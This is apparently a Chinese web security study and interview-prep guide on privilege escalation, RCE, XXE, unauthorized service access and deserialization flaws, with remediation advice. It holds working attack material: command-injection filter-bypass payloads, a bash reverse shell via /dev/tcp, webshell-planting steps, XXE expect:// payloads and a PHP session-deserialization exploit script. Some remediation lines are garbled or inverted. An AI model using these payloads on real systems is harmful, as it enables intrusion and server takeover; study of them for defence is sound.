
# 越权漏洞分类

```
1.根据数据库分类
根据对数据库的操作进行分类，可以分为以下几类：
越权查询、越权删除、越权修改、越权添加。

2.根据维度进行分类
根据维度进行分类，可分为：平行越权、垂直越权、交叉越权。
平行越权：
权限类型不变，权限ID改变。
例如ab属于同一级别的用户，但是彼此不能操作对方的个人信息，A越权操作b的个人信息的情况就称之为水平越权。
垂直越权：
权限ID不变，权限类型改变。
例如低权限a和高权限b两个用户，A越权成为和b同级别的用户，称之为垂直越权。
交叉越权：
权限类型改变，权限ID也改变。
例如低权限a和高权限b两个用户，A越权操作成为b的情况就称之为交叉越权。

3.特例
未授权访问：
本来没有账号（即没有某个功能权限），但是通过越权操作，获取了某个功能权限；
最简单直接的测试方法是：不登录用户账号，直接访问要测试的功能模块（正常情况是需要登录才能访问），如果能正常访问，则说明存在漏洞。
```





# 如何检测水平越权漏洞

```
1、登陆自己的账号；
2、执行敏感操作，比如说修改手机号；
3、抓取刚刚的数据包，修改数据包中的id信息，进行重放攻击；
4、如果重放攻击攻击的id手机号被修改了；那么就存在水平越权漏洞。
```



# 如何检测垂直越权漏洞

```
1、首先我们登录一个超级管理用的账号；
2、执行一个特殊权限，比如说只有超级管理员可以新建账号，那我们就新建一个账号；
3、执行时，我们把新增账号这个数据包抓下来；
4、抓下来之后我们退出超级管理员，登录普通用户；
5、把刚刚抓取到的数据包用普通管理管的身份去进行一次重放；
6、如果新建用户成功，也就是说用普通管理员的权限去进行了一次只有超级管理员才能进行的操作如果说这个操作成功就意味着后台存在垂直越权漏洞。
```



# RCE

```
原理
应用系统从设计上需要给用户提供指定的远程命令操作的接口,可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。

系统命令执行函数
system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()


代码执行函数
eval()：将字符串作为php代码执行；
assert()：将字符串作为php代码执行；
preg_replace()：正则匹配替换字符串；
create_function()：主要创建匿名函数；
call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；
call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；
可变函数：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行；


windows系统命令拼接方式
“|”:管道符，前面命令标准输出，后面命令的标准输入。例如：help |more
“&” commandA & commandB 先运行命令A，然后运行命令B
“||” commandA || commandB 运行命令A，如果失败则运行命令B
“&&” commandA && commandB 运行命令A，如果成功则运行命令B


RCE漏洞的分类
RCE漏洞分为代码执行和命令执行两种

代码执行
概述：源代码能够把字符串当做代码运行
影响范围：能够做代码能够做的事情
注意事项：这个输入的代码要与源代码的语言相同，即源代码用的php写的就必须用php的语句。

命令执行
概述：源代码能够把字符串当做系统的命令执行
影响范围：可以做系统命令能够做的事情
注意事项：windows和linux的命令是不同的，需要先分辨一下对方系统。

空格过滤
以下可代替空格
<	<>	%20(即space)
%09(即tab)	$IFS$9	${IFS}
$IFS	{cat,/flag}

反斜杠\绕过
//如cat、ls被过滤，使用\绕过
c\at /flag
l\s /


取反绕过
//取反传参
<?php
 
$a = "system";
$b = "cat /flag";
 
$c = urlencode(~$a);
$d = urlencode(~$b);
 
//输出得到取反传参内容
echo "?cmd=(~".$c.")(~".$d.");"
?>


异或绕过
# 异或构造Python脚本
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
 
answer = input('输入异或构造的字符串:')
 
tmp1, tmp2 = '', ''
for c in answer:
    for i in valid:
        for j in valid:
            if ord(i) ^ ord(j) == ord(c):
                tmp1 += i
                tmp2 += j
                break
        else:
            continue
        break
 
print(f'"{tmp1}"^"{tmp2}"')

//异或php脚本
 
<?php
$a='phpinfo';
for ($i = 0;$i <strlen($a);$i++)
    echo '%'.dechex(ord($a[$i])^0xff);
echo "^";
for ($j=0;$j<strlen($a);$j++)
    echo '%ff';
?>
 
//输出：%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff
//简单例题，flag再phpinfo()中，需要执行php命令：phpinfo();
 
<?php
show_source(__FILE__);
$mess=$_POST['mess'];
if(preg_match("/[a-zA-Z]/",$mess)){
    die("invalid input!");
}
eval($mess);
 
 
//构造payload,字符串phpinfo异或结果为"0302181"^"@[@[_^^"
 
mess=$_="0302181"^"@[@[_^^";$_();


自增绕过
//自增payload，assert($_POST[_]),命令传入_
 
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);&_=phpinfo();

黑名单绕过
//变量拼接，如flag被过滤
将：
cat /flag
替换为：
b=ag;cat /fl$b
 
//读取根目录
eval(var_dump(scandir('/'););
//读flag
eval(var_dump(file_get_contents($_POST['a'])););&a=/flag
 
 
 
//等效于打开ls目录下的文件
cat `ls`
 
//_被过滤，php8以下，变量名中的第一个非法字符[会被替换为下划线_
N[S.S等效于N_S.S
php需要接收e_v.a.l参数,给e[v.a.l传参即可
 
//php标签绕过
?><?= phpinfo(); ?>

base和hex编码绕过
//base64编码绕过,编码cat /flag，反引号、| bash、$()用于执行系统命令
`echo Y2F0IC9mbGFn | base64 -d`
echo Y2F0IC9mbGFn | base64 -d | bash
$(echo Y2F0IC9mbGFn | base64 -d)
 
//hex编码绕过，编码cat /flag,| bash用于执行系统命令
echo '636174202f666c6167' | xxd -r -p | bash
 
//shellcode编码
//十六进制编码

正则匹配绕过
//如flag被过滤
cat /f???
cat /fl*
cat /f[a-z]{3}

引号绕过
//如cat、ls被过滤
ca""t /flag
l's' /

cat替换命令
more	less	cat	tac
head	tail	vi	vim
nl	od	sort	uniq
tac	与cat相反，按行反向输出
more	按页显示，用于文件内容较多且不能滚动屏幕时查看文件
less	与more类似
tail	查看文件末几行
head	查看文件首几行
nl	在cat查看文件的基础上显示行号
od	以二进制方式读文件，od -A d -c /flag转人可读字符
xxd	以二进制方式读文件，同时有可读字符显示
sort	排序文件
uniq	报告或删除文件的重复行
file -f	报错文件内容
grep	过滤查找字符串，grep flag /flag

2.使用转义符
ca\t 文件名

3.变量绕过
a=c;b=a;c=t;
$a$b$c 文件名

4.编码进制绕过
如下，先对命令进行编码或者做进制处理，然后再执行。这里我才用了base64编码。

echo 'cat' | base64
`echo 'Y2F0wqAK' | base64 -d` 文件名


回溯绕过
//php正则的回溯次数大于1000000次时返回False
$a = 'hello world'+'h'*1000000
preg_match("/hello.*world/is",$a) == False

无回显RCE
//无回显RCE，如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可
ls / | tee 1.txt
cat /flag | tee 2.txt
//eval()无输出
eval(print`c\at /flag`;)

无参数RCE
        利用getallheaders()、get_defined_vars()、session_id等；

无字母数字RCE
        异或、取反、自增、临时文件上传；


rce漏洞危害
继承Web服务器程序权限，去执行系统命令；
继承Web服务器权限，读写文件；
反弹shell；
控制整个网站甚至是服务器；

rce漏洞修复
对用户的输入作严格的过滤，如白名单策略；
尽量使用容易产生漏洞的危险函数；
保证用户不用控制危险函数的传参；

preg_replace触发漏洞的前提吗？
preg_replace函数第一个参数存在e修饰符时，第二个参数和第三个参数可能当作PHP代码被执行。
preg_replace漏洞触发有两个前提：
1、第一个参数需要e标识符，有了它可以执行第二个参数的命令。
2、第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令。

一个站点存在RCE漏洞，如何getshell？
反弹shell就行了，我一般使用bash反弹shell，有时候也会用nc或者python。
举例：
本地采用nc监听
nc -lvvp 端口
远程执行命令
bash -i >& /dev/tcp/本地监听IP/本地监听端口 0>&1
进行exec编码之后就可以远程执行了。

一个站点RCE存在漏洞，怎么利用webshell进行连接？
1、找到他的web路径。
2、使用touch命令在web目录创建一个webshell文件。
3、然后使用ehco命令在webshell文件里面写入webshell代码。
4、然后使用chmod命令给文件增加777权限。
5、最后采用菜刀蚁剑等webshell连接工具进行连接。
```



# XXE

```
原理
XXE就是外部实体注入漏洞，XXE漏洞产生的原因是由于应用程序解析XML时，没有过滤外部实体的加载，导致加载了恶意的外部文件，造成命令执行、文件读取、内网扫描、内网应用攻击等危害

危害
任意文件读取。可以配合任意文件上传漏洞实现getshell
通过某些协议（比如安装expect扩展的PHP环境中）可以实现远程命令执行
通过HTTP协议探测内网端口

如何修复
使用开发语言提供的禁用外部实体来防止注入
过滤用户提交的XML数据。比如过滤掉<!DOCTYPE或<!ENTITY

攻击方式
方式一，构建如下payload：`]>``
通过file协议可以实现任意文件读取

方式二，构建payload：<!DOCTYPE a [<!ENTITY file SYSTEM "http://127.0.0.1:81">]>
通过HTTP协议可以实现端口探测

方式三，构建payload：<!DOCTYPE a [<!ENTITY file SYSTEM "expect://whoami">]>
通过expect协议可以执行系统命令
```



# 未授权访问漏洞

```
原理
在于系统对用户的限制不全或无限制，导致任意用户可以访问内部敏感信息，从而导致信息泄露以及系统功能的执行。

常见未授权访问漏洞
1.Active MQ 未授权访问
2.Atlassian Crowd 未授权访问
3.CouchDB 未授权访问
4.Docker 未授权访问
5.Dubbo 未授权访问
6.Druid 未授权访问
7.Elasticsearch 未授权访问
8.FTP 未授权访问
9.Hadoop 未授权访问
10. JBoss 未授权访问
11.Jenkins 未授权访问
12.Jupyter Notebook 未授权访问
13.Kibana 未授权访问
14.Kubernetes Api Server 未授权访问
15.LDAP 未授权访问
16.MongoDB 未授权访问
17.Memcached 未授权访问
18.NFS 未授权访问
19.Rsync 未授权访问
20.Redis 未授权访问
21.RabbitMQ 未授权访问
22.Solr 未授权访问
23.Spring Boot Actuator 未授权访问
24.Spark 未授权访问
25.VNC 未授权访问
26.Weblogic 未授权访问
27.ZooKeeper 未授权访问
28.Zabbix 未授权访问

常问未授权漏洞
redis
spring
apache
nginx
jboss


未授权修复

ElasticSearch 未授权访问
检测方式：
curl http://公网IP:9200/_cat/indices/
若返回集群名称等敏感信息，则说明存在相关风险。
修复建议：
1）9200端口不要对外开放，如需开放，建议在云控制台-安全组限制只允许指定IP才能访问9200端口，或者在主机防火墙上设置禁止外网访问9200端口： 
2）在config/elasticsearch.yml中为9200端口设置认证，相关配置参数可参考：

MongoDB 未授权访问
检测方式：
(1) 检测是否仅监听 127.0.0.1
方法1：
ps -ef|grep mongodb   //查看命令行是否绑定了本地地址，为--bind_ip 127.0.0.1
方法2：
vim /etc/mongodb.conf //查看bind_ip字段是否为bind_ip = 127.0.0.1

(2) 检测是否开启 auth 认证 

代码语言：javascript
复制
mongod --auth  //查看是否需要认证密码
vim /etc/mongodb.conf //查看auth字段是否为 true
auth = true

修复建议：
1）为MongoDB添加认证：MongoDB 启动时添加–auth参数、为MongoDB添加用户认证；
2）MongoDB 自身带有一个HTTP服务和并支持REST接口，在2.6以后这些接口默认是关闭的。MongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。可以修改配置文件设置 nohttpinterface=false
或在启动的时候选择参数 --nohttpinterface。
3）使用云控制台安全组防火墙或本地系统防火墙对访问源IP进行控制，如果仅对内网服务器提供服务，建议勿将 MongoDB服务发布到互联网上。
4）启动时加入参数 --bind_ip 127.0.0.1 或在 /etc/mongodb.conf 文件中添加以下内容：bind_ip = 127.0.0.1，只允许本地访问。

Hadoop 未授权访问
检测方式：
访问 http://192.168.xx.xx:8088/cluster，检查YARN ResourceManager WebUI 是否对公网开放
本地检查Hadoop 50070、50075等端口是否对公网开放。

修复建议：
网络访问控制
登录云控制台，设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口
关闭公网敏感服务
如无必要，关闭 Hadoop Web 管理页面
启用认证功能
启用 Kerberos 认证功能，或部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问

Kibana 未授权访问
检测方式：

直接访问 kibana 的页面，如：

http://192.168.126.130:5601/
https://192.168.126.130/app/kibana#
http://192.168.126.130:5601/app/kibana#/

若无需账号密码可以登录进入界面，则说明在受影响范围。

修复建议：

设置防火墙策略，限定制定 IP 访问服务；
设置 kibana 监听本地地址，并设置ElasticSearch登录的账号和密码；
Step1：设置kibana监听本地地址，并设置ElasticSearch登录的账号和密码：

代码语言：javascript
复制
elasticsearch.url: "http://127.0.0.1:9200"
#这里输入ElasticSearch的账号和密码
elasticsearch.username: "user"
elasticsearch.password: "pass"
Step2：使用htpasswd创建kibana登录的账号密码，这里可以复用ElasticSearch创建的账号密码，也可以重新创建一个。

代码语言：javascript
复制
htpasswd -c /usr/local/service/nginx/conf/htpasswd username
配置 nginx 反向代理，配置好后，重启 nginx 和 kibana，通过15601登录验证访问Kibana
代码语言：javascript
复制
server {
    # 通过反向代理对kibana身份认证
    listen 15601;
    server_name localhost;
    location / { 
        auth_basic "xxxxx";
        auth_basic_user_file /usr/local/service/nginx/conf/htpasswd;
        
        proxy_pass http://127.0.0.1:5601;
         }
     }
     
     
CouchDB 未授权访问
检测方式：

curl http://192.168.126.130:5984

curl http://192.168.126.130:5984/_config

若返回CouchDB版本或配置等敏感信息，则说明存在相关风险。

修复建议：

1）指定CouchDB绑定的IP （需要重启CouchDB才能生效） ：在 /etc/couchdb/local.ini 文件中找到 bind_address = 0.0.0.0，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。

2）设置访问密码 （需要重启CouchDB才能生效） 在配置文件 /etc/couchdb/local.ini中找到 [admins] 字段配置密码

Confluence 未授权访问漏洞
检测方式：
用户可通过查看当前Confluence版本是否在受影响范围内，对当前服务是否受此漏洞影响进行排查。
修复建议（推荐）：
官方建议用户升级至最新版本，以保证服务的安全性及稳定性。
```



# 反序列化漏洞

```
1、序列化
序列化serialize()
序列化说通俗点就是把一个对象变成可以传输的字符串,序列化的目的是方便数据的传输和存储。在PHP应用中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。

常见的序列化格式：

二进制格式
字节数组
json字符串
xml字符串

2、反序列化
反序列化unserialize()
就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。

常见php反序列化 java反序列化 fastjson反序列化 session反序列化

魔术方法
 常见的几个魔法函数:
        __construct()当一个对象创建时被调用
        __destruct()当一个对象销毁时被调用
        __toString()当一个对象被当作一个字符串使用
        __sleep() 在对象在被序列化之前运行
        __wakeup将在序列化之后立即被调用
        __get()用于从不可访问的属性读取数据

        漏洞举例:

        class S{
            var $test = "pikachu";
            function __destruct(){
                echo $this->test;
            }
        }
        $s = $_GET['test'];
        @$unser = unserialize($a);

        payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}

<?php
class Test{
public function __construct(){
echo 'construct run';
}
public function __destruct(){
echo 'destruct run';
}
public function __toString(){
echo 'toString run';
return 'str';
}
public function __sleep(){
echo 'sleep run';
return array();
}
public function __wakeup(){
echo 'wakeup run';
}
}
​
echo '<br>new了一个对象，对象被创建，执行__construct</br>';
$test = new Test();
​
echo '<br>serialize了一个对象，对象被序列化，先执行__sleep，再序列化</br>';
$sTest = serialize($test);
​
echo '<br>__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</br>';
$usTest = unserialize($sTest);
​
echo '<br>把Test对象当做字符串使用，执行__toString</br>';
$string = 'use Test obj as str '.$test;
​
echo '<br>程序执行完毕，对象自动销毁，执行__destruct</br>';
​
?>


2、利用方式
强调几个注意点：

1.不要为了方便直接修改序列化字符串，因为可能导致字符串长度和实际字符串长度不一致，进而导致无法正确反序列化

建议将类拷贝下来，用序列化函数生成

2.一些进一步渗透的思路：

尝试是否可以写入shell
尝试读取当前目录下的有哪些文件
尝试读取所有文件的源码
import requests
import threading
 
url = "http://web.jarvisoj.com:32784/phpinfo.php"
headers = {
    "Cookie": "PHPSESSID=icancontrolit"
}
files = {
    "myfile": ("file.jpg", open("class.php", "rb")),
}
payload = '|O:5:"OowoO":1:{s:4:"mdzz";s:14:"var_dump(123);";}'
# payload ="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}"
# payload ="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}"
data = {
    "PHP_SESSION_UPLOAD_PROGRESS":payload,
}
resp = requests.post(url=url, files=files, headers=headers, data=data)
# print(resp.text)
url = "http://web.jarvisoj.com:32784"
resp = requests.get(url,headers=headers);
print(resp.text)

2.1、__wakeup( )绕过
反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。

影响版本：

PHP before 5.6.25
7.x before 7.0.10
如果使用正常的方法构造payload

url?text=0:1:"A":1:{s:6:"taget";s:18:"<?php phpinfo();?>";}
1
__wakeup( )把$taget重置成wakeup!


令属性个数的值大于1

url?text=0:1:"A":2:{s:6:"taget";s:18:"<?php phpinfo();?>";}
1
成功执行 phpinfo()

session反序列化
Session反序列化漏洞
PHP中的Session经序列化后存储，读取时再进行反序列化。

相关配置：

session.save_path=“” //设置session的存储路径

session.save_handler=“” //设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)

session.auto_start boolen //指定会话模块是否在请求开始时启动一个会话默认为0不启动

session.serialize_handler string//定义用来序列化/反序列化的处理器名字。默认使用php

PHP中有三种序列化处理器，如下表所示：

serializer	实现方法
php	键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
php_binary	键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
php_serialize	把整个$_SESSION数组作为一个数组序列化
不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的Session序列化格式不同，就可能产生反序列化漏洞。

Java 序列化与反序列化的函数？

在Java 原生的API 中：

操作	函数
序列化	ObjectOutputStream.writeObject()
反序列化	ObjectInputStream.readObject()

Java 中常见命令执行函数有那些？

Runtime.getRuntime().exec(“wireshark”);

Java 反序列化漏洞利用方式有几种，涉及那些工具？

利用方式：

RMI
JNDI

工具：

ysoserial
marshalsec
JNDI-Injection-Exploit

DNSLOG 用过么？

大多数反序列化漏洞造成RCE 攻击是没有回显的，利用dnslog 平台，在RCE 的时候构造DNS 请求，如果dnslog 平台能够收到DNS 请求，说明RCE 成功，也就验证了漏洞存在性。


如何检测FastJson 漏洞是否存在，并且判断其版本？

可以使用BurpSuite 扩展FastjsonScan 进行漏洞检测。


Shiro550 反序列化漏洞原理：
记住我的功能开启之后，会有Cookie 数据，Cookie 数据其实就是加密后的经过序列化的用户对象，也就是二进制字节流。
加密算法是AES 算法，算法很安全，但是秘钥是固定的，并且存储于源码中。

Shiro721 利用条件：
AES 秘钥不在是固定的了，但是此秘钥可以被爆破
需要提供一个合法用户，再点击remember me ，成功登录之后，获取Cookie remember-me 的值。

Apache Shiro 550 和721 区别？
这两个漏洞主要区别在于Shiro550使用已知密钥碰撞，不需要Remember Cookie
Shiro721的ase加密的key基本猜不到，系统随机生成，可使用登录后rememberMe去爆破正确的key值，即利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后构造 RememberMe Cookie 值来实现反序列化漏洞攻击


Apache Shiro框架进行登录，服务端在接收cookie时，会经过下面的流程：
1、检索RememberMe Cookie的值
2、Base64解码
3、AES解密（加密密钥硬编码）
4、进行反序列化操作（未过滤处理）
5、攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令



1、Shiro框架1.2.4版本之前的登录时默认是先验证"rememberMe" Cookie的值，而不是先进行身份验证，这也是Shiro550漏洞能够利用的原因之一，攻击者可以利用该漏洞通过伪造"rememberMe" Cookie的值来绕过Shiro框架的身份认证机制，从而实现未授权访问

2、Shiro框架1.2.4版本之后的登录时先进行身份验证，而不是先验证"rememberMe" Cookie的值，所以攻击者需要知道受害者已经通过登录验证，并且Shiro框架已经为受害者创建了一个有效的会话，以便攻击者可以利用该会话ID进行身份伪造并绕过Shiro框架的权限控制机制

3、同时，Shiro框架的登录流程也是可以自定义的

```

